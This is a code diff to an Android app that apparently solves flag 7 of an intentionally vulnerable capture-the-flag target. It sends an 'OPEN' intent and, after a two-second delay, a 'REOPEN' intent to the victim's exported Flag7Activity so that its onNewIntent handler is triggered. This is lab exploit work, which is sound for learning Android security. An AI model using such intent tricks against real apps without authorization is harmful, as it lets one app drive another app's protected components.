@@ -4,6 +4,7 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Handler;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -35,7 +36,7 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 homeText.setText(" text changes after button click");
-                flag6Solution();
+                flag7Solution();
             }
         });
     }
@@ -104,4 +105,26 @@ public class MainActivity extends AppCompatActivity {
         Log.i("Intent Redirection",Utils.dumpIntent(this,intent));
         startActivity(intent);
     }
+
+    private void flag7Solution() {
+//        Activity life cycle tricks. ie delay to simulate a user action
+//        meant to reach OnNewIntent of the victim apps lifecycle
+
+        Intent openIntent = new Intent();
+        openIntent.setComponent(new ComponentName(packageName, packageName + ".activities.Flag7Activity"));
+        openIntent.setAction("OPEN");
+        openIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Start the activity
+        startActivity(openIntent);
+
+        // Step 2: Delay to simulate user interaction or lifecycle processing
+        new Handler().postDelayed(() -> {
+            // Step 3: Create the "REOPEN" intent to trigger onNewIntent()
+            Intent reopenIntent = new Intent();
+            reopenIntent.setComponent(new ComponentName(packageName, packageName + ".activities.Flag7Activity"));
+            reopenIntent.setAction("REOPEN");
+            reopenIntent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); // Ensure it's handled by the same instance
+            startActivity(reopenIntent);
+        }, 2000); // 2-second delay
+    }
+
 }
